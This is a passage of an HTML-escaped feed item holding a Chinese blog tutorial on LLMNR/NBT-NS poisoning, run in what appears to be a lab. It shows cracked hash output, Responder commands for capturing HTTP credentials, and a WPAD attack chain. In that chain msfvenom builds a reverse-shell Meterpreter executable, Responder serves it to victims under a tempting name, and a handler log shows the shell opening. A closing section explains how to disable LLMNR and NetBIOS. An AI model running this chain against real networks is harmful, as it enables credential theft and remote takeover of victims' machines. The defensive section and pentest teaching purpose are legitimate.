-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Time.Started.....: Mon Feb &lt;span class=&#34;m&#34;&gt;14&lt;/span&gt; 12:25:27 &lt;span class=&#34;m&#34;&gt;2022&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; secs&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Time.Estimated...: Mon Feb &lt;span class=&#34;m&#34;&gt;14&lt;/span&gt; 12:25:27 &lt;span class=&#34;m&#34;&gt;2022&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; secs&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Guess.Base.......: File &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;passwd.txt&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Guess.Queue......: 1/1 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;100.00%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Speed.#1.........:     &lt;span class=&#34;m&#34;&gt;1922&lt;/span&gt; H/s &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.01ms&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; @ Accel:1024 Loops:1 Thr:1 Vec:16
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Recovered........: 1/1 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;100.00%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; Digests
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Progress.........: 1/1 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;100.00%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Rejected.........: 0/1 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.00%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Restore.Point....: 0/1 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.00%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Candidates.#1....: p@ssw0rd -&amp;gt; p@ssw0rd
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Started: Mon Feb &lt;span class=&#34;m&#34;&gt;14&lt;/span&gt; 12:25:26 &lt;span class=&#34;m&#34;&gt;2022&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Stopped: Mon Feb &lt;span class=&#34;m&#34;&gt;14&lt;/span&gt; 12:25:29 &lt;span class=&#34;m&#34;&gt;2022&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;虽然这个方式很隐蔽，但是如果遇到密码比较强的就很难受。&lt;/p&gt;
-&lt;h2 id=&#34;捕获http明文&#34;&gt;捕获HTTP明文&lt;/h2&gt;
-&lt;p&gt;我们可以使用responder工具是去获取HTTP的&lt;a href=&#34;https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Authorization&#34;&gt;Authorization&lt;/a&gt;信息，主要的方法就是开启HTTP认证的功能-b即可：&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;┌──&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;kali㉿kali&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;~&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;└─$ sudo responder -I eth0 -fvb 
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;我们去输入未验证过的网址就会弹出验证窗口，让我们输入凭证：&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/LLMNR_NetBIOS/6.png&#34; alt=&#34;6&#34;&gt;&lt;/p&gt;
-&lt;p&gt;输入后就可以在kali中看到我们输入的明文信息：&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/LLMNR_NetBIOS/7.png&#34; alt=&#34;7&#34;&gt;&lt;/p&gt;
-&lt;p&gt;我们查看流量中是获取到了http认证的信息，解密base64即可：&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/LLMNR_NetBIOS/8.png&#34; alt=&#34;8&#34;&gt;&lt;/p&gt;
-&lt;p&gt;这个功能还是不错的，就是动作比较明显。&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;如果未能获取到明文凭证可以尝试重启下受害者的机器&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;h2 id=&#34;利用wpad攻击获取系统权限&#34;&gt;利用WPAD攻击获取系统权限&lt;/h2&gt;
-&lt;p&gt;用户在访问网页时，首先会查询PAC文件的位置，具体方式如下：&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;1、通过DHCP服务器&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;如图&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://wooyun.js.org/images_result/images/201512071422587546237.png&#34; alt=&#34;这里写图片描述&#34;&gt;&lt;/p&gt;
-&lt;p&gt;web浏览器向DHCP服务器发送DHCP INFORM查询PAC文件位置&lt;/p&gt;
-&lt;p&gt;DHCP服务器返回DHCP ACK数据包，包含PAC文件位置&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;2、通过DNS查询&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;web浏览器向DNS服务器发起 WPAD＋X 的查询&lt;/p&gt;
-&lt;p&gt;DNS服务器返回提供WPAD主机的IP地址&lt;/p&gt;
-&lt;p&gt;web浏览器通过该IP的80端口下载wpad.dat&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;3、通过NBNS查询&lt;/strong&gt;&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;Tips：&lt;/p&gt;
-&lt;p&gt;Windows 2K , XP , 2K3 只支持 DNS 和 NetBIOS&lt;/p&gt;
-&lt;p&gt;Windows Vista 之后（包括 2K8 ， Win7，Win8.x，Win 10）支持DNS、NBNS、LLMNR&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p&gt;如果DHCP和DNS服务器均没有响应，同时当前缓存没有所请求的主机名，就会发起如下名称解析：&lt;/p&gt;
-&lt;p&gt;如果当前系统支持LLMNR（Link-Local Multicast Name Resolution），先发起广播LLMNR查询，如果没有响应再发起广播NBNS查询&lt;/p&gt;
-&lt;p&gt;如果有主机回应PAC文件位置&lt;/p&gt;
-&lt;p&gt;web浏览器通过该IP的80端口下载wpad.dat&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;这里的内容来自于&lt;a href=&#34;https://wooyun.js.org/drops/%E5%9F%BA%E4%BA%8EWPAD%E7%9A%84%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB.html&#34;&gt;
-基于WPAD的中间人攻击&lt;/a&gt;&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p&gt;WPAD功能在上面做了介绍，主要是攻击原理如下图,&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/LLMNR_NetBIOS/9.jpeg&#34; alt=&#34;9&#34;&gt;&lt;/p&gt;
-&lt;p&gt;我们先去msf生成一个exe文件：&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo msfvenom -p windows/x64/meterpreter/reverse_https &lt;span class=&#34;nv&#34;&gt;LHOST&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;172.16.0.107 &lt;span class=&#34;nv&#34;&gt;LPORT&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;4444&lt;/span&gt; -f exe -o /usr/share/responder/files/filetoserve.exe 
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;然后去编辑responder的配置文件，文件位置在&lt;code&gt;/usr/share/responder/Responder.conf&lt;/code&gt;,修改下面的配置为On：&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;[HTTP Server]
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;; Set to On to always serve the custom EXE
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Serve-Always = On
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;; Set to On to replace any requested .exe with the custom EXE
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Serve-Exe = On 
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;; Set to On to serve the custom HTML if the URL does not contain .exe
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;; Set to Off to inject the &amp;#39;HTMLToInject&amp;#39; in web pages instead
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Serve-Html = On 
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;在kali执行：&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo responder -I eth0 -wrfv
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;在msf中执行监听：&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;msf6 exploit&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;multi/handler&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; use exploit/multi/handler
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;msf6 exploit&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;multi/handler&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; payload windows/x64/meterpreter/reverse_https
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; windows/x64/meterpreter/reverse_https
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;msf6 exploit&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;multi/handler&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; show options
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Module options &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;exploit/multi/handler&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;:
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   Name  Current Setting  Required  Description
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   ----  ---------------  --------  -----------
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Payload options &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;windows/x64/meterpreter/reverse_https&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;:
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   Name      Current Setting  Required  Description
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   ----      ---------------  --------  -----------
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   EXITFUNC  process          yes       Exit technique &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Accepted: &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;, seh, thread, process, none&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   LHOST     172.16.0.107     yes       The &lt;span class=&#34;nb&#34;&gt;local&lt;/span&gt; listener hostname
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   LPORT     &lt;span class=&#34;m&#34;&gt;53&lt;/span&gt;               yes       The &lt;span class=&#34;nb&#34;&gt;local&lt;/span&gt; listener port
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   LURI                       no        The HTTP Path
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Exploit target:
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   Id  Name
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   --  ----
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;   Wildcard Target
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;msf6 exploit&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;multi/handler&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; lport &lt;span class=&#34;m&#34;&gt;4444&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;lport&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&#34;m&#34;&gt;4444&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;msf6 exploit&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;multi/handler&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; run
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;在受害机的网页中输入地址会弹出下载文件(可以修改一些比较诱惑性的，比如flash.exe等)：&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/LLMNR_NetBIOS/10.png&#34; alt=&#34;10&#34;&gt;&lt;/p&gt;
-&lt;p&gt;看到记录已经在发送文件的数据了：&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/LLMNR_NetBIOS/11.png&#34; alt=&#34;11&#34;&gt;&lt;/p&gt;
-&lt;p&gt;当受害者执行exe后会反弹回msf的shell：&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;msf6 exploit&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;multi/handler&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; run
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Started HTTPS reverse handler on https://172.16.0.107:4444
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;!&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; https://172.16.0.107:4444 handling request from 172.16.0.105&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;UUID: fvlb5805&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; Without a database connected that payload UUID tracking will not work!
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; https://172.16.0.107:4444 handling request from 172.16.0.105&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;UUID: fvlb5805&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; Staging x64 payload &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;201308&lt;/span&gt; bytes&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; ...
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;!&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; https://172.16.0.107:4444 handling request from 172.16.0.105&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;UUID: fvlb5805&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; Without a database connected that payload UUID tracking will not work!
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Meterpreter session &lt;span class=&#34;m&#34;&gt;52&lt;/span&gt; opened &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;172.16.0.107:4444 -&amp;gt; 127.0.0.1 &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; at 2022-02-14 10:42:49 +0800
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;meterpreter &amp;gt; sysinfo
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Computer        : WIN-JH8N3KV3OQ0
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;OS              : Windows &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;6.1 Build 7601, Service Pack 1&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Architecture    : x64
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;System Language : en_US
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Domain          : HACK
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Logged On Users : &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Meterpreter     : x64/windows
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;meterpreter &amp;gt;  
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;0x04-防御&#34;&gt;0x04 防御&lt;/h1&gt;
-&lt;p&gt;主要还是关掉&lt;strong&gt;LLMNR&lt;/strong&gt;和&lt;strong&gt;NBT-NS&lt;/strong&gt;，如果只关闭其中一个也会被攻击成功，所以都要关掉才行，&lt;/p&gt;
-&lt;h2 id=&#34;关闭llmnr&#34;&gt;关闭LLMNR&lt;/h2&gt;
-&lt;ol&gt;
-&lt;li&gt;
-&lt;p&gt;win+R输入gpedit.msc&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;找到路径Local Computer Policy -&amp;gt; Computer Configuration -&amp;gt; Administrative Templates -&amp;gt; Network -&amp;gt; DNS Client&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;找到&lt;strong&gt;Turn Off Multicast Name Resolution&lt;/strong&gt;，点击enable即可&lt;/p&gt;
-&lt;/li&gt;
-&lt;/ol&gt;
-&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/LLMNR_NetBIOS/12.png&#34; alt=&#34;12&#34;&gt;&lt;/p&gt;
-&lt;h2 id=&#34;关闭netbios&#34;&gt;关闭NetBIOS&lt;/h2&gt;
-&lt;ol&gt;
-&lt;li&gt;打开网络共享中心&lt;/li&gt;
-&lt;li&gt;点击更改适配器设置&lt;/li&gt;
-&lt;li&gt;选择指定的网卡，右键属性&lt;/li&gt;
-&lt;li&gt;选择Internet 协议版本 4 (TCP/IPv4)&lt;/li&gt;
-&lt;li&gt;点击高级&lt;/li&gt;
-&lt;li&gt;选择WINS选项，点击禁用TCP/IP上的NetBIOS&lt;/li&gt;
-&lt;/ol&gt;
-&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/LLMNR_NetBIOS/13.png&#34; alt=&#34;13&#34;&gt;&lt;/p&gt;
-&lt;h2 id=&#34;修复结果&#34;&gt;修复结果&lt;/h2&gt;
-&lt;p&gt;关闭两者后再尝试回出现错误：&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/LLMNR_NetBIOS/14.png&#34; alt=&#34;14&#34;&gt;&lt;/p&gt;
-&lt;h1 id=&#34;0x05-参考&#34;&gt;0x05 参考&lt;/h1&gt;
-&lt;p&gt;&lt;a href=&#34;https://www.sternsecurity.com/blog/local-network-attacks-llmnr-and-nbt-ns-poisoning/&#34;&gt;https://www.sternsecurity.com/blog/local-network-attacks-llmnr-and-nbt-ns-poisoning/&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;&lt;a href=&#34;https://pentest.blog/what-is-llmnr-wpad-and-how-to-abuse-them-during-pentest/&#34;&gt;https://pentest.blog/what-is-llmnr-wpad-and-how-to-abuse-them-during-pentest/&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;&lt;a href=&#34;https://apt404.github.io/2016/07/24/llmnr-wpad/&#34;&gt;https://apt404.github.io/2016/07/24/llmnr-wpad/&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;&lt;a href=&#34;https://github.com/lgandx/Responder&#34;&gt;https://github.com/lgandx/Responder&lt;/a&gt;&lt;/p&gt;
 </description>
       
     </item>
